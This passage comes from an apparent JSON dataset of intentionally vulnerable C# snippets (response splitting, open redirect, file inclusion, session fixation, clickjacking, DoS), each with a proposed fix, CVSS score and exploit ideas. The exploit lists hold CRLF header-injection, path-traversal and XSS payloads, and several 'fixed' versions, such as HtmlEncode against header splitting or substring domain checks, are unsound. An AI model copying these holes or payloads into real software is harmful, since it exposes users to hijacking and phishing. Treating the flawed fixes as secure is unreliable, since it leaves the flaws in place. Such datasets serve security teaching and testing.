        "vulnerability_code": "using System;\nusing System.Web;\npublic class ResponseSplitter {\n    public void GenerateResponse(string userInput) {\n        HttpResponse response = HttpContext.Current.Response;\n        response.Write(\"<h1>Welcome, \" + userInput + \"!</h1>\");\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class ResponseSplitter {\n    public void GenerateResponse(string userInput) {\n        HttpResponse response = HttpContext.Current.Response;\n        string safeInput = HttpUtility.HtmlEncode(userInput);\n        response.Write(\"<h1>Welcome, \" + safeInput + \"!</h1>\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'User\\r\\nSet-Cookie: admin=true;' to set a cookie on the victim's browser.",
            "They can use 'User\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Attacker Content</h1>' to inject arbitrary HTML content into the response.",
            "Input like 'User\\r\\nLocation: http://malicious.com' can redirect users to a malicious site."
        ]
    },
    "c#_27": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "using System;\nclass InfiniteLoopVulnerability {\n    public void Run() {\n        while (true) {\n            Console.WriteLine(\"Running...\");\n        }\n    }\n}",
        "cvss_score": 3.7,
        "fixed_code": "using System;\nclass SafeLoop {\n    public void Run() {\n        int count = 0;\n        while (count < 100) { // Limit the number of iterations\n            Console.WriteLine(\"Running...\");\n            count++;\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can trigger the Run method, causing the application to hang indefinitely.",
            "This can exhaust system resources by running multiple instances concurrently.",
            "The infinite loop can prevent other processes or threads from executing properly."
        ]
    },
    "c#_28": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\nusing System.Net;\nclass Program {\n    static void Main(string[] args) {\n        string userInput = Console.ReadLine();\n        WebHeaderCollection headers = new WebHeaderCollection();\n        headers[\"Set-Cookie\"] = \"user=\" + userInput + \"; path=/\";\n        HttpListener listener = new HttpListener();\n        listener.Prefixes.Add(\"http://localhost:8080/\");\n        listener.Start();\n        while (true) {\n            HttpListenerContext context = listener.GetContext();\n            HttpListenerRequest request = context.Request;\n            HttpListenerResponse response = context.Response;\n            response.Headers.Add(headers);\n            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(request.RawUrl);\n            response.OutputStream.Write(buffer, 0, buffer.Length);\n            response.Close();\n        }\n    }\n}",
        "cvss_score": 6.1,
        "fixed_code": "using System;\nusing System.Net;\nclass Program {\n    static void Main(string[] args) {\n        string userInput = Console.ReadLine().Replace(\"\\r\", \"\").Replace(\"\\n\", \"\");\n        WebHeaderCollection headers = new WebHeaderCollection();\n        headers[\"Set-Cookie\"] = \"user=\" + userInput + \"; path=/\";\n        HttpListener listener = new HttpListener();\n        listener.Prefixes.Add(\"http://localhost:8080/\");\n        listener.Start();\n        while (true) {\n            HttpListenerContext context = listener.GetContext();\n            HttpListenerRequest request = context.Request;\n            HttpListenerResponse response = context.Response;\n            response.Headers.Add(headers);\n            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(request.RawUrl);\n            response.OutputStream.Write(buffer, 0, buffer.Length);\n            response.Close();\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'user\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hacked</body></html>' to inject a fake response.",
            "They can add 'user\\r\\nLocation: http://malicious.com' to redirect users to a malicious site.",
            "Input like 'user\\r\\nContent-Type: text/plain' can change the content type of the response."
        ]
    },
    "c#_29": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "using System;\nusing System.IO;\nclass Program {\n    static void Main() {\n        Console.WriteLine(\"Enter file path:\");\n        string filePath = Console.ReadLine();\n        if (File.Exists(filePath)) {\n            string content = File.ReadAllText(filePath);\n            Console.WriteLine(content);\n        } else {\n            Console.WriteLine(\"File not found.\");\n        }\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "using System;\nusing System.IO;\nclass Program {\n    static void Main() {\n        Console.WriteLine(\"Enter file path:\");\n        string filePath = Console.ReadLine();\n        string[] allowedPaths = { \"allowed_file1.txt\", \"allowed_file2.txt\" };\n        if (Array.Exists(allowedPaths, element => element == filePath) && File.Exists(filePath)) {\n            string content = File.ReadAllText(filePath);\n            Console.WriteLine(content);\n        } else {\n            Console.WriteLine(\"File not found or access denied.\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can input a path to sensitive files like \"/etc/passwd\".",
            "They could use relative paths to access other files in the same directory, e.g., \"../secret.txt\".",
            "By entering a crafted path, they might be able to exploit additional vulnerabilities if the program processes file contents insecurely."
        ]
    },
    "c#_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "using System;\npublic class SessionManager {\n    private string sessionId;\n\n    public void SetSessionId(string id) {\n        this.sessionId = id;\n    }\n\n    public string GetSessionId() {\n        return this.sessionId;\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System;\npublic class SessionManager {\n    private string sessionId;\n\n    public void SetSessionId(string id) {\n        if (string.IsNullOrEmpty(id))\n            throw new ArgumentException(\"Invalid session ID\");\n        this.sessionId = GenerateSecureSessionId();\n    }\n\n    private string GenerateSecureSessionId() {\n        return Convert.ToBase64String(System.Security.Cryptography.RandomNumberGenerator.GetBytes(32));\n    }\n\n    public string GetSessionId() {\n        return this.sessionId;\n    }\n}",
        "exploit_ways": [
            "An attacker could predict or set the session ID to gain unauthorized access.",
            "By fixing the session ID, an attacker can maintain control over a user's session without authentication.",
            "The attacker might use the fixed session ID to hijack sessions on systems that do not regenerate session IDs after login."
        ]
    },
    "c#_31": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System; using System.Web; public class HttpResponseSplitter { public void SendResponse(HttpContext context) { string userInput = context.Request.QueryString[\"userInput\"]; context.Response.Write(\"<h1>Welcome, \" + userInput + \"!</h1>\"); } }",
        "cvss_score": 7.5,
        "fixed_code": "using System; using System.Web; public class HttpResponseSplitter { public void SendResponse(HttpContext context) { string userInput = context.Request.QueryString[\"userInput\"]; context.Response.Write(\"<h1>Welcome, \" + HttpUtility.HtmlEncode(userInput) + \"!</h1>\"); } }",
        "exploit_ways": [
            "An attacker can input 'name%0d%0aSet-Cookie:maliciousCookie=true' to inject malicious cookies.",
            "They can use 'name%0d%0aContent-Length:123456789' to cause the server to send an incorrect content length, disrupting further responses.",
            "Input like 'name%0d%0aHTTP/1.1%20200%20OK' can be used to inject a new HTTP response."
        ]
    },
    "c#_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "using System;\r\nusing System.Threading;\r\nclass Program\r\n{\r\n    private static int sharedResource = 0;\r\n\r\n    static void Main()\r\n    {\r\n        Thread thread1 = new Thread(IncrementSharedResource);\r\n        Thread thread2 = new Thread(IncrementSharedResource);\r\n\r\n        thread1.Start();\r\n        thread2.Start();\r\n\r\n        thread1.Join();\r\n        thread2.Join();\r\n\r\n        Console.WriteLine(\"Final value of shared resource: \" + sharedResource);\r\n    }\r\n\r\n    static void IncrementSharedResource()\r\n    {\r\n        for (int i = 0; i < 10000; i++)\r\n        {\r\n            int temp = sharedResource;\r\n            Thread.Sleep(0); // Simulate some work\r\n            sharedResource = temp + 1;\r\n        }\r\n    }\r\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\r\nusing System.Threading;\r\nclass Program\r\n{\r\n    private static int sharedResource = 0;\r\n    private static readonly object lockObject = new object();\r\n\r\n    static void Main()\r\n    {\r\n        Thread thread1 = new Thread(IncrementSharedResource);\r\n        Thread thread2 = new Thread(IncrementSharedResource);\r\n\r\n        thread1.Start();\r\n        thread2.Start();\r\n\r\n        thread1.Join();\r\n        thread2.Join();\r\n\r\n        Console.WriteLine(\"Final value of shared resource: \" + sharedResource);\r\n    }\r\n\r\n    static void IncrementSharedResource()\r\n    {\r\n        for (int i = 0; i < 10000; i++)\r\n        {\r\n            lock(lockObject)\r\n            {\r\n                int temp = sharedResource;\r\n                Thread.Sleep(0); // Simulate some work\r\n                sharedResource = temp + 1;\r\n            }\r\n        }\r\n    }\r\n}",
        "exploit_ways": [
            "An attacker could manipulate thread timing to cause inconsistent or incorrect values in the shared resource.",
            "By repeatedly running the program, they might observe that the final value of the shared resource is not consistently 20000 due to race conditions.",
            "In a more complex system, this could lead to race conditions affecting critical data integrity."
        ]
    },
    "c#_33": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "using System; using System.Web.Security; public class UserSessionManager { private static readonly string[] validUsernames = { \"admin\", \"user1\", \"user2\" }; public void Authenticate(string username, string sessionToken) { if (Array.Exists(validUsernames, element => element == username)) { FormsAuthentication.SetAuthCookie(username, false); } else { throw new Exception(\"Invalid username\"); } } public bool ValidateSession(string sessionToken) { var ticket = FormsAuthentication.Decrypt(sessionToken); return ticket != null && ticket.Expired == false; } }",
        "cvss_score": 3.1,
        "fixed_code": "using System; using System.Web.Security; using System.Web; public class UserSessionManager { private static readonly string[] validUsernames = { \"admin\", \"user1\", \"user2\" }; public void Authenticate(string username, HttpContext context) { if (Array.Exists(validUsernames, element => element == username)) { FormsAuthentication.SetAuthCookie(username, false); } else { throw new Exception(\"Invalid username\"); } HttpCookie authCookie = context.Request.Cookies[FormsAuthentication.FormsCookieName]; if (authCookie != null) { authCookie.HttpOnly = true; authCookie.Secure = true; } } public bool ValidateSession(string sessionToken) { var ticket = FormsAuthentication.Decrypt(sessionToken); return ticket != null && !ticket.Expired; } }",
        "exploit_ways": [
            "An attacker can use a pre-known session token to hijack a legitimate user's session.",
            "They could create a malicious link with the fixed session token to trick users into clicking it, leading to unauthorized access.",
            "If the session token is predictable or reused across sessions, attackers might guess and exploit it to gain unauthorized access."
        ]
    },
    "c#_34": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "public void LoadExternalContent(string url)\n{\n    webBrowser1.Navigate(url);\n}",
        "cvss_score": 4.2,
        "fixed_code": "public void LoadExternalContent(string url)\n{\n    if (IsValidUrl(url))\n    {\n        webBrowser1.Navigate(url);\n    }\n}\n\nprivate bool IsValidUrl(string url)\n{\n    Uri uri;\n    return Uri.TryCreate(url, UriKind.Absolute, out uri) && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps);\n}",
        "exploit_ways": [
            "An attacker could navigate the user to a malicious URL that overlays a fake UI over legitimate content.",
            "Users might be tricked into clicking buttons or links on an invisible iframe overlay, leading to unintended actions.",
            "Malicious content can steal session cookies or perform actions under the user's credentials by manipulating the visible web page."
        ]
    },
    "c#_35": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "using System;\nusing System.IO;\nclass Program {\n    static void Main(string[] args) {\n        string filePath = @\"C:\\\\path\\\\to\\\\sensitivefile.txt\";\n        if (File.Exists(filePath)) {\n            string content = File.ReadAllText(filePath);\n            Console.WriteLine(content);\n        } else {\n            Console.WriteLine(\"File not found.\");\n        }\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System;\nusing System.IO;\nclass Program {\n    static void Main(string[] args) {\n        string filePath = @\"C:\\\\path\\\\to\\\\sensitivefile.txt\";\n        try {\n            string content = File.ReadAllText(filePath);\n            Console.WriteLine(\"File read successfully.\");\n        } catch (Exception ex) {\n            Console.WriteLine(\"An error occurred: \" + ex.Message);\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker with access to the system could read sensitive information by running the program.",
            "If the file path is predictable, an attacker could place a malicious file at that location to be disclosed.",
            "Logging errors can reveal the existence of sensitive files through exception messages."
        ]
    },
    "c#_36": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class UrlHandler : IHttpHandler {\n    public void ProcessRequest(HttpContext context) {\n        string redirectUrl = context.Request.QueryString[\"url\"];\n        if (IsValidRedirect(redirectUrl)) {\n            context.Response.Redirect(redirectUrl);\n        } else {\n            context.Response.Write(\"Invalid URL\");\n        }\n    }\n    private bool IsValidRedirect(string url) {\n        // Very complex validation logic that is hard to bypass\n        return true;\n    }\n    public bool IsReusable => false;\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class UrlHandler : IHttpHandler {\n    private static readonly string[] allowedDomains = { \"example.com\", \"sub.example.com\" };\n\n    public void ProcessRequest(HttpContext context) {\n        string redirectUrl = context.Request.QueryString[\"url\"];\n        if (IsValidRedirect(redirectUrl)) {\n            context.Response.Redirect(redirectUrl);\n        } else {\n            context.Response.Write(\"Invalid URL\");\n        }\n    }\n\n    private bool IsValidRedirect(string url) {\n        var uri = new Uri(url);\n        return Array.Exists(allowedDomains, d => uri.Host.EndsWith(d));\n    }\n\n    public bool IsReusable => false;\n}",
        "exploit_ways": [
            "An attacker can redirect users to a phishing site by providing a malicious URL.",
            "They could use the vulnerability to perform cross-site scripting (XSS) attacks if combined with other vulnerabilities.",
            "By crafting specific URLs, attackers might exploit this to launch social engineering campaigns."
        ]
    },
    "c#_37": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "using System.Web.UI;\n\npublic partial class DefaultPage : Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        string iframe = \"<iframe src=\\\"https://malicious.example.com/\\\" style=\\\"opacity:0;position:absolute;z-index:9999;\\\"></iframe>\";\n        ClientScript.RegisterStartupScript(this.GetType(), \\\"iframe\\\", iframe, false);\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System.Web.UI;\n\npublic partial class DefaultPage : Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        Response.Headers.Add(\"X-Frame-Options\", \"SAMEORIGIN\");\n    }\n}",
        "exploit_ways": [
            "An attacker can host a malicious website that embeds the target site in an iframe to trick users into clicking on unintended elements.",
            "Attackers could use social engineering tactics, convincing users to visit a crafted page that performs actions on their behalf without their knowledge.",
            "By exploiting clickjacking, attackers can manipulate user interactions to perform unauthorized actions like form submissions or button clicks."
        ]
    },
    "c#_38": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "using System;\nusing System.IO;\nclass FileReader {\n    public void ReadFile(string filePath) {\n        if (filePath.Contains(\"..\")) {\n            throw new ArgumentException(\\\"Invalid file path\\\");\n        }\n        string content = File.ReadAllText(filePath);\n        Console.WriteLine(content);\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "using System;\nusing System.IO;\nclass FileReader {\n    public void ReadFile(string filePath) {\n        string safePath = Path.GetFullPath(filePath);\n        if (!safePath.StartsWith(Path.GetFullPath(\"./allowed_directory\"))) {\n            throw new ArgumentException(\\\"Invalid file path\\\");\n        }\n        string content = File.ReadAllText(safePath);\n        Console.WriteLine(content);\n    }\n}",
        "exploit_ways": [
            "An attacker can use a relative path to include unauthorized files, such as 'path/to/file.txt'.",
            "They could attempt to exploit null byte injection if not properly handled by using 'file.php%00/etc/passwd'.",
            "Crafting paths with URL encoding like '%2e%2e/' might bypass simple checks in some environments."
        ]
    },
    "c#_39": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class RedirectHandler : IHttpHandler {\n    public void ProcessRequest(HttpContext context) {\n        string url = context.Request.QueryString[\"url\"];\n        if (url != null) {\n            context.Response.Redirect(url);\n        }\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class RedirectHandler : IHttpHandler {\n    private static readonly string[] allowedDomains = { \"example.com\", \"safeurl.com\" };\n    public void ProcessRequest(HttpContext context) {\n        string url = context.Request.QueryString[\"url\"];\n        if (url != null && IsAllowedUrl(url)) {\n            context.Response.Redirect(url);\n        }\n    }\n\n    private bool IsAllowedUrl(string url) {\n        foreach (var domain in allowedDomains) {\n            if (Uri.IsWellFormedUriString(url, UriKind.Absolute) && new Uri(url).Host.EndsWith(domain)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by appending '?url=http://malicious.com' to the URL.",
            "They could exploit this vulnerability to perform phishing attacks by redirecting to fake login pages.",
            "Attackers might use it to spread malware by redirecting users to sites hosting malicious downloads."
        ]
    },
    "c#_40": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "using System.Security.Permissions;\npublic class ClickjackableFrame\n{\n    [PermissionSet(SecurityAction.Demand, Name = \"FullTrust\")]\n    public void DisplayFrame(string url)\n    {\n        System.Windows.Forms.WebBrowser browser = new System.Windows.Forms.WebBrowser();\n        browser.Navigate(url);\n        browser.Dock = System.Windows.Forms.DockStyle.Fill;\n        System.Windows.Forms.Form form = new System.Windows.Forms.Form();\n        form.Controls.Add(browser);\n        form.ShowDialog();\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System.Security.Permissions;\npublic class SecureFrame\n{\n    [PermissionSet(SecurityAction.Demand, Name = \"FullTrust\")]\n    public void DisplayFrame(string url)\n    {\n        if (!IsTrustedUrl(url))\n            throw new Exception(\"Untrusted URL\");\n        System.Windows.Forms.WebBrowser browser = new System.Windows.Forms.WebBrowser();\n        browser.Navigate(url);\n        browser.Dock = System.Windows.Forms.DockStyle.Fill;\n        System.Windows.Forms.Form form = new System.Windows.Forms.Form();\n        form.Controls.Add(browser);\n        form.ShowDialog();\n    }\n\n    private bool IsTrustedUrl(string url)\n    {\n        // Implement URL validation logic here\n        return url.StartsWith(\"https://trusted.example.com/\");\n    }\n}",
        "exploit_ways": [
            "An attacker could frame a malicious site that tricks users into clicking buttons on the trusted page.",
            "Attackers can host phishing content in an iframe and overlay it with transparent elements from the legitimate site.",
            "Malicious sites can force users to perform actions like login or data submission without their knowledge."
        ]
    },
    "c#_41": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class HttpResponseSplitter {\n    public void DisplayUserInput(HttpContext context) {\n        string userInput = context.Request.QueryString[\"userInput\"];\n        context.Response.Write(\"<html><body>\");\n        context.Response.Write(userInput);\n        context.Response.Write(\\\"</body></html>\\\");\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class HttpResponseSplitter {\n    public void DisplayUserInput(HttpContext context) {\n        string userInput = HttpUtility.HtmlEncode(context.Request.QueryString[\"userInput\"]);\n        context.Response.Write(\"<html><body>\");\n        context.Response.Write(userInput);\n        context.Response.Write(\\\"</body></html>\\\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input '%0d%0aSet-Cookie: evilCookie=evilValue' to inject malicious cookies.",
            "Using '%0d%0aContent-Length: 1000%0d%0aContent-Type: text/html' to alter response headers.",
            "Injecting JavaScript via '%3Cscript%3Ealert(%27XSS%27)%3C/script%3E' can lead to reflected XSS if not properly handled."
        ]
    },
    "c#_42": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "using System;\npublic class Program {\n    public static void Main(string[] args) {\n        Console.WriteLine(\"Enter your username:\");\n        string username = Console.ReadLine();\n        Console.WriteLine(\"Username entered: \" + username);\n    }\n}",
        "cvss_score": 2.5,
        "fixed_code": "using System;\npublic class Program {\n    public static void Main(string[] args) {\n        Console.WriteLine(\"Enter your username:\");\n        string username = Console.ReadLine();\n        // Do not echo back the username for security reasons\n    }\n}",
        "exploit_ways": [
            "An attacker could observe the console output to discover usernames.",
            "In a logging environment, logged data might expose sensitive user input.",
            "If part of a larger application, this could lead to more detailed information leakage."
        ]
    },
    "c#_43": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "using System;\\nusing System.Web;\\npublic class RedirectHandler : IHttpHandler {\\n    public void ProcessRequest(HttpContext context) {\\n        string url = context.Request.QueryString[\"url\"];\n        if (url != null) {\\n            context.Response.Redirect(url);\\n        }\\n    }\\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\\nusing System.Web;\\npublic class RedirectHandler : IHttpHandler {\\n    private static readonly string[] allowedDomains = { \"example.com\", \"sub.example.com\" };\\n    public void ProcessRequest(HttpContext context) {\\n        string url = context.Request.QueryString[\"url\"];\n        if (url != null && IsAllowedUrl(url)) {\\n            context.Response.Redirect(url);\\n        } else {\\n            context.Response.StatusCode = 400;\\n        }\\n    }\\n    private bool IsAllowedUrl(string url) {\\n        foreach (var domain in allowedDomains) {\\n            if (url.Contains(domain)) return true;\\n        }\\n        return false;\\n    }\\n}",
        "exploit_ways": [
            "An attacker could redirect users to a malicious site, e.g., http://attacker.com/malicious",
            "They can use the open redirect to phish for credentials by redirecting to a fake login page.",
            "Crafted URLs with JavaScript payloads could be used to execute code in the context of the victim's browser."
        ]
    },
    "c#_44": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\npublic class HttpResponseSplitter {\n    public void SendResponse(string userInput) {\n        string response = $\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n{userInput}\\r\\n<html><body>Hello</body></html>\";\n        Console.WriteLine(response);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\npublic class HttpResponseSplitter {\n    public void SendResponse(string userInput) {\n        string sanitizedInput = userInput.Replace(\"\\r\", \"\").Replace(\"\\n\", \"\");\n        string response = $\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n{sanitizedInput}\\r\\n<html><body>Hello</body></html>\";\n        Console.WriteLine(response);\n    }\n}",
        "exploit_ways": [
            "An attacker could inject '\\r\\nSet-Cookie: exploit=true' to set a malicious cookie.",
            "They can insert '\\r\\nLocation: http://attacker.com' to redirect users to a malicious site.",
            "Using '\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Exploit</body></html>' to inject an additional response."
        ]
    },
    "c#_45": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class UserProfile\n{\n    public void SetUserCookie(string userName)\n    {\n        string cookieValue = HttpUtility.UrlEncode(userName);\n        HttpContext.Current.Response.Cookies[\"user\"].Value = cookieValue;\n    }\n}",
        "cvss_score": 5.4,
        "fixed_code": "using System;\nusing System.Web;\npublic class UserProfile\n{\n    public void SetUserCookie(string userName)\n    {\n        string cookieValue = HttpUtility.UrlPathEncode(userName);\n        HttpContext.Current.Response.Cookies[\"user\"].Value = cookieValue;\n    }\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: admin=true' to set an additional malicious cookie.",
            "Could use '\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: 38\\r\\n\\r\\n<html><body>Malicious Content</body></html>' to inject a secondary HTTP response.",
            "Injecting '\\r\\nLocation: http://malicious.com' can redirect users to an attacker-controlled site."
        ]
    },
    "c#_46": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "using System;\\nclass Program {\\n    static int sharedResource = 0;\\n    static void Main() {\\n        var t1 = new System.Threading.Thread(Increment);\\n        var t2 = new System.Threading.Thread(Increment);\\n        t1.Start();\\n        t2.Start();\\n        t1.Join();\\n        t2.Join();\\n        Console.WriteLine(sharedResource);\\n    }\\n    static void Increment() {\\n        for (int i = 0; i < 1000; i++) {\\n            sharedResource++;\\n        }\\n    }\\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System;\\nclass Program {\\n    static int sharedResource = 0;\\n    static readonly object lockObject = new object();\\n    static void Main() {\\n        var t1 = new System.Threading.Thread(Increment);\\n        var t2 = new System.Threading.Thread(Increment);\\n        t1.Start();\\n        t2.Start();\\n        t1.Join();\\n        t2.Join();\\n        Console.WriteLine(sharedResource);\\n    }\\n    static void Increment() {\\n        for (int i = 0; i < 1000; i++) {\\n            lock (lockObject) {\\n                sharedResource++;\\n            }\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker could run the program multiple times to observe inconsistent results due to race conditions.",
            "By carefully controlling thread execution timing, an attacker might force the shared resource to have unexpected values.",
            "In a larger application, this flaw could lead to data corruption or security vulnerabilities in concurrent operations."
        ]
    },
    "c#_47": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "using System;\nusing System.Web.Security;\nclass Program {\n    static void Main(string[] args) {\n        FormsAuthentication.SetAuthCookie(\"user\", false);\n        Console.WriteLine(FormsAuthentication.GetAuthCookie(\"user\", false).Value);\n    }\n}",
        "cvss_score": 2.5,
        "fixed_code": "using System;\nusing System.Web.Security;\nclass Program {\n    static void Main(string[] args) {\n        string newSessionId = Guid.NewGuid().ToString();\n        FormsAuthentication.SetAuthCookie(\"user\", false);\n        HttpCookie authCookie = FormsAuthentication.GetAuthCookie(\"user\", false);\n        authCookie.Value = newSessionId;\n        Console.WriteLine(authCookie.Value);\n    }\n}",
        "exploit_ways": [
            "An attacker could predict or obtain a session ID and use it to hijack the user's session.",
            "By fixing the session ID, an attacker can reuse the same session across different devices or browsers without logging in again.",
            "The vulnerability allows attackers to maintain persistent access by using the fixed session ID."
        ]
    },
    "c#_48": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class RedirectController : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        string url = Request.QueryString[\"url\"];\n        if (url != null)\n        {\n            Response.Redirect(url);\n        }\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class RedirectController : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        string url = Request.QueryString[\"url\"];\n        string[] allowedUrls = { \"https://example.com/\", \"https://anotherdomain.com/\" };\n        if (url != null && Array.Exists(allowedUrls, s => s == url))\n        {\n            Response.Redirect(url);\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing a URL like \"https://malicious.com\" as the query parameter.",
            "They could use this vulnerability to phishing attacks by redirecting users to fake login pages that resemble legitimate ones.",
            "Attackers might also exploit it for session fixation attacks by redirecting users to URLs with known session tokens."
        ]
    },
    "c#_49": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "public void SlowFunction() {\n    while (true) {\n        for (int i = 0; i < int.MaxValue; i++) {\n            // Simulate a time-consuming operation\n            double result = Math.Sqrt(i);\n        }\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "public void SlowFunction() {\n    while (true) {\n        for (int i = 0; i < 1000000; i++) { // Limit the loop iterations\n            // Simulate a time-consuming operation\n            double result = Math.Sqrt(i);\n        }\n        Thread.Sleep(1000); // Sleep to prevent high CPU usage\n    }\n}",
        "exploit_ways": [
            "An attacker can trigger this function, causing high CPU usage and making the system unresponsive.",
            "If part of a web service, it can be exploited to cause DoS on other legitimate users by exhausting server resources.",
            "In a multi-threaded environment, multiple invocations can lead to resource exhaustion and system crash."
        ]
    }
}